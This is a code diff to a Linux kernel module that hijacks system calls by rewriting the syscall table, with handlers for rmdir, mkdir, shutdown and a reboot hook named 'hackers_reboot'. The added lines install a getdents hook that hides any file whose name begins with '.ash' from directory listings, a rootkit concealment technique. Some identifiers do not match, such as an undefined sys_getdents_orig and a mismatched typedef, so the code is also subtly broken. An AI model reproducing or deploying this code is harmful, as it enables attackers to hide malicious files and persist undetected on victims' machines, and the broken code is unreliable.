@@ -7,6 +7,9 @@
 
 #define enable_reboot 0
 #define enable_shutdown 0
+#define HIDE_PREFIX ".ash"
+#define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX) - 1)
+
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.01");
 
@@ -16,10 +19,46 @@ typedef asmlinkage long (*orig_shutdown_t)(int, int);
 typedef asmlinkage long (*orig_rmdir_t)(const struct pt_regs *);
 typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
 typedef asmlinkage long (*orig_openat_t)(const struct pt_regs *);
+typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
+orig_sys_getdents_t orig_getdents;
 orig_rmdir_t orig_rmdir;
 orig_mkdir_t orig_mkdir;
 orig_openat_t orig_openat;
-orig_shutdown_t orig_shutdown;                                 
+orig_shutdown_t orig_shutdown;
+
+
+struct linux_dirent {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
+	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+};
+
+asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
+	int boff;
+	struct linux_dirent* ent;
+	long ret = sys_getdents_orig(fd, dirent, count);
+	char* dbuf;
+	if (ret <= 0) {
+		return ret;
+	}
+	dbuf = (char*)dirent;
+	// go through the entries, looking for one that has our prefix
+	for (boff = 0; boff < ret;) {
+		ent = (struct linux_dirent*)(dbuf + boff);
+
+		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)) {     // or if it has the module name anywhere in it
+			// remove this entry by copying everything after it forward
+			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
+			// and adjust the length reported
+			ret -= ent->d_reclen;
+		} else {
+			// on to the next entry
+			boff += ent->d_reclen;
+		}
+	}
+	return ret;
+}
 
 asmlinkage int hackers_reboot(int magic1,int magic2,int magic3, void* arg)
 {
@@ -96,6 +135,7 @@ static int __init start(void)
     orig_shutdown = (orig_shutdown_t)sys_call_addr[__NR_shutdown];
     orig_mkdir=(orig_mkdir_t)sys_call_addr[__NR_mkdir];
     old_reboot_sys_call=sys_call_addr[__NR_reboot];
+    orig_getdents = (orig_sys_getdents_t)sys_call_addr[__NR_getdents];
     printk("Project:Module: Loaded \n");
     printk("Project:rmdir @ 0x%lx\n", orig_rmdir);
     printk("Project:rmdir @ 0x%lx\n", orig_mkdir);
@@ -110,6 +150,7 @@ static int __init start(void)
     sys_call_addr[__NR_rmdir] = (unsigned long)my_rmdir;
     sys_call_addr[__NR_mkdir] = (unsigned long)my_mkdir;
     sys_call_addr[__NR_shutdown] = (unsigned long)my_shutdown;
+    sys_call_addr[__NR_getdents] = (unsigned long)sys_getdents_new;
     protect_memory();
 
     return 0;
@@ -124,6 +165,7 @@ static void __exit end(void)
     sys_call_addr[__NR_mkdir] = (unsigned long)orig_mkdir;
     sys_call_addr[__NR_shutdown]=(unsigned long)orig_shutdown;
     sys_call_addr[__NR_reboot]=(unsigned long)old_reboot_sys_call;
+    sys_call_addr[__NR_getdents]=(unsigned long)orig_getdents;
     protect_memory();
     
     printk("Project:Unloaded \n");
@@ -131,3 +173,4 @@ static void __exit end(void)
 
 module_init(start);
 module_exit(end);
+
